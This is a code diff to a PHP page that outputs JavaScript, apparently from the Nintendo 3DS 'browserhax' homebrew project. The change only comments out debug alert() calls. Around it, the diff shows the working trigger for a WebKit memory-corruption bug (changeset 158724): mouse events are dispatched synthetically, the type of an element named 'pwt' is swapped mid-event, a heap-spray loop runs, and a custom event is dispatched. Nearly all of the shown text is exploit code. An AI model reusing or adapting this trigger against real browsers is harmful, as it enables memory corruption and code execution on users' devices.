@@ -5,7 +5,7 @@ $con = "<html>
 <script>
 //http://trac.webkit.org/changeset/158724
 //Different version of 3dsbrowserhax_webkit_r158724.php which also works with new3ds. Most of the below html/js is by kemurphy, the heap spray stuff / etc is by yellows8.
-//It seems the alert() calls are needed, otherwise the vuln doesn't (always?) trigger.
+//It seems the alert(\"test2\") call is needed, otherwise the vuln doesn't (always?) trigger.
 
 var s = new String(unescape(\"12341234\"));
 var pwt = null;
@@ -13,21 +13,21 @@ var pwt = null;
 obj = new Array();
 
 function down(x) {
-alert(\"down\");
+//alert(\"down\");
     var evt = document.createEvent('MouseEvents');
     evt.initMouseEvent('mousedown',true,true,document.defaultView,0,x,0,x,0,false,false,false,0,null,null);
     pwt.dispatchEvent(evt);
 }
 
 function up(x) {
-alert(\"up\");
+//alert(\"up\");
     var evt = document.createEvent('MouseEvents');
     evt.initMouseEvent('mouseup',true,true,document.defaultView,0,x,0,x,0,false,false,false,0,null,null);
     pwt.dispatchEvent(evt);
 }
 
 function strap() {
-alert(\"strap\");
+//alert(\"strap\");
     pwt = document.getElementById('pwt');
     down(0);
 }
@@ -36,19 +36,19 @@ function two() {
     up(20);
     pwt.onmousedown = null;
 
-   alert(\"two\");
+   //alert(\"two\");
 }
 
 function one() {
     up(0);
     pwt.onmousedown = two;
 
-    alert(\"one\");
+    //alert(\"one\");
 
     pwt.onchange = null;
     down(20);
 
-alert(\"test\");
+//alert(\"test\");
 
     pwt.type = 'hax';
 alert(\"test2\");
@@ -63,9 +63,9 @@ for(i=0; i<300000; i++)
 }
 
     var hax = document.createEvent('CustomEvent');
-alert(\"test3\");
+//alert(\"test3\");
     hax.initCustomEvent('trololo',true,false,{});
-    alert(\"three\");
+    //alert(\"three\");
 
     document.dispatchEvent(hax);
     up(20);
